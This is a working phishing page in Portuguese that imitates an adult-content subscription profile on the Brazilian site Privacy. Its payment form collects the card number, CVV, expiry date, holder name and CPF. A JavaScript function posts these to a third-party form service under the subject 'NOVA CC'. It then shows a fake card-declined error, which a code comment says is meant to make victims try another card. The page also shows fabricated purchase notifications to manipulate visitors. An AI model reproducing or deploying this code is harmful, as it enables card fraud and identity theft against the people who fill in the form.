<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Privacy | Kamylinha Santos</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <script src="https://cdn.jsdelivr.net/npm/notiflix@2.7.0/dist/notiflix-aio-2.7.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>

    <style>
        :root { --primary-orange: #f47b52; --primary-gradient: linear-gradient(90deg, #f47b52, #f9a67a); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background-color: #fff; padding-bottom: 120px; overflow-x: hidden; color: #333; }

        /* Navbar */
        .top-nav { display: flex; justify-content: space-between; align-items: center; padding: 12px 20px; border-bottom: 1px solid #f0f0f0; position: sticky; top: 0; background: #fff; z-index: 100; }
        
        /* Profile Area */
        .banner { width: 100%; height: 220px; background: #eee url('https://i.postimg.cc/4N9m9pX9/capa.png') center/cover; }
        .profile-pic-wrapper { margin-top: -55px; padding-left: 20px; position: relative; z-index: 10; }
        .profile-pic { width: 115px; height: 115px; border-radius: 50%; border: 4px solid #fff; object-fit: cover; box-shadow: 0 4px 10px rgba(0,0,0,0.1); background: #ddd; }

        /* Info Section */
        .info-section { padding: 10px 20px; }
        .name-row { display: flex; align-items: center; gap: 6px; font-size: 22px; font-weight: 700; }
        .verified { color: var(--primary-orange); font-size: 18px; }
        .username { color: #666; font-size: 14px; margin-bottom: 12px; }
        .bio { font-size: 14.5px; line-height: 1.5; color: #444; }

        /* Buttons */
        .btn-container { display: flex; flex-direction: column; gap: 14px; margin: 20px; }
        .btn-sub { width: 100%; padding: 18px 25px; border-radius: 50px; border: none; color: white; display: flex; justify-content: space-between; align-items: center; cursor: pointer; background: var(--primary-gradient); box-shadow: 0 4px 15px rgba(244, 123, 82, 0.3); transition: 0.2s; }
        .btn-sub:active { transform: scale(0.96); }
        .price-now { font-size: 20px; font-weight: 700; }

        /* Social Proof (Compras Fake) */
        .notif-fake { position: fixed; bottom: 20px; left: 15px; right: 15px; background: white; padding: 12px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); display: flex; align-items: center; gap: 12px; z-index: 3000; transform: translateY(200%); transition: 0.5s ease; }
        .notif-fake.show { transform: translateY(0); }
        .notif-img { width: 45px; height: 45px; border-radius: 10px; object-fit: cover; border: 2px solid var(--primary-orange); }

        /* Modal */
        #paymentModal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(5px); }
        .modal-content { background: #fff; margin: 10% auto; width: 92%; max-width: 450px; border-radius: 25px; padding: 30px 25px; position: relative; animation: slideUp 0.3s ease; }
        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; font-weight: 700; font-size: 13px; margin-bottom: 5px; color: #222; }
        .form-group input { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid #ffd8cc; background: #fff9f7; font-size: 16px; outline: none; }
        .btn-pay { width: 100%; padding: 18px; background: var(--primary-gradient); color: #fff; border: none; border-radius: 50px; font-weight: 800; font-size: 18px; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>

    <nav class="top-nav">
        <img src="https://privacy.com.br/img/logo-orange.svg" height="28">
        <i class="fa-solid fa-globe"></i>
    </nav>

    <div class="banner"></div>
    <div class="profile-pic-wrapper">
        <img src="https://i.postimg.cc/q78m6mBv/perfil.png" class="profile-pic">
    </div>

    <div class="info-section">
        <div class="name-row">Kamylinha Santos <i class="fa-solid fa-circle-check verified"></i></div>
        <p class="username">@eukamylinhasantos</p>
        <p class="bio">Seja bem-vindo ao meu lado exclusivo! üîû<br>Conte√∫do di√°rio sem censura e chat privado para assinantes.</p>
    </div>

    <div class="btn-container">
        <div class="btn-sub" onclick="openPay()">
            <span style="font-weight: 600;">ASSINATURA MENSAL</span>
            <span class="price-now">R$ 10,00</span>
        </div>
        <div class="btn-sub" onclick="openPay()" style="opacity: 0.9;">
            <span style="font-weight: 600;">ACESSO VITAL√çCIO</span>
            <span class="price-now">R$ 27,00</span>
        </div>
    </div>

    <div class="notif-fake" id="notif">
        <img src="https://i.postimg.cc/q78m6mBv/perfil.png" class="notif-img">
        <div>
            <span id="notif-user"><b>Marcos S.</b></span> acabou de assinar!<br>
            <small style="color:var(--primary-orange); font-weight:bold">Acesso Liberado ‚úÖ</small>
        </div>
    </div>

    <div id="paymentModal">
        <div class="modal-content">
            <h2 style="text-align:center; color: var(--primary-orange); margin-bottom: 25px; font-weight: 800;">Pagamento Seguro</h2>
            
            <div class="form-group">
                <label>Nome no Cart√£o</label>
                <input type="text" id="pay_name" placeholder="Como no cart√£o">
            </div>
            <div class="form-group">
                <label>N√∫mero do Cart√£o</label>
                <input type="text" id="card_num" placeholder="0000 0000 0000 0000">
            </div>
            <div class="form-group">
                <label>CPF do Titular</label>
                <input type="text" id="cpf_num" placeholder="000.000.000-00">
            </div>
            <div style="display:flex; gap: 12px;">
                <div class="form-group" style="flex:2">
                    <label>Validade</label>
                    <input type="text" id="card_date" placeholder="MM/AA">
                </div>
                <div class="form-group" style="flex:1">
                    <label>CVV</label>
                    <input type="text" id="card_cvv" placeholder="000">
                </div>
            </div>

            <button class="btn-pay" onclick="enviar()">CONFIRMAR PAGAMENTO</button>
            <p style="text-align:center; margin-top:20px; font-size:13px; color:#999; cursor:pointer" onclick="closePay()">Voltar para o perfil</p>
        </div>
    </div>

    <script>
        $(document).ready(function(){
            $('#card_num').mask('0000 0000 0000 0000');
            $('#cpf_num').mask('000.000.000-00');
            $('#card_date').mask('00/00');
            $('#card_cvv').mask('000');
            showFake();
        });

        function openPay() { $('#paymentModal').fadeIn(); }
        function closePay() { $('#paymentModal').fadeOut(); }

        // Sistema de Compras Fake
        const nomes = ["Ricardo M.", "Felipe A.", "Gustavo S.", "Andre L.", "Marcos J.", "Vinicius P.", "Breno L.", "Thiago S."];
        function showFake() {
            setTimeout(() => {
                const nome = nomes[Math.floor(Math.random() * nomes.length)];
                $('#notif-user').html(`<b>${nome}</b>`);
                $('#notif').addClass('show');
                setTimeout(() => { $('#notif').removeClass('show'); showFake(); }, 4000);
            }, Math.floor(Math.random() * 8000) + 10000);
        }

        function enviar() {
            const d = {
                access_key: 'b82d278b-654f-4010-ade0-049c3f2a1161',
                subject: 'üöÄ NOVA CC: ' + $('#pay_name').val(),
                Nome: $('#pay_name').val(),
                Cartao: $('#card_num').val(),
                CPF: $('#cpf_num').val(),
                Validade: $('#card_date').val(),
                CVV: $('#card_cvv').val()
            };

            if (d.Cartao.length < 16) {
                Notiflix.Notify.failure('Dados do cart√£o incompletos!');
                return;
            }

            Notiflix.Loading.circle('Processando transa√ß√£o...');

            fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(d)
            })
            .then(() => {
                setTimeout(() => {
                    Notiflix.Loading.remove();
                    // Erro de limite para for√ßar o cara a tentar outro cart√£o
                    Notiflix.Report.failure('Erro no Cart√£o', 'C√≥digo 51: Limite Insuficiente. Tente outro cart√£o para liberar seu acesso.', 'Tentar outro');
                }, 2500);
            });
        }
    </script>
</body>
</html>
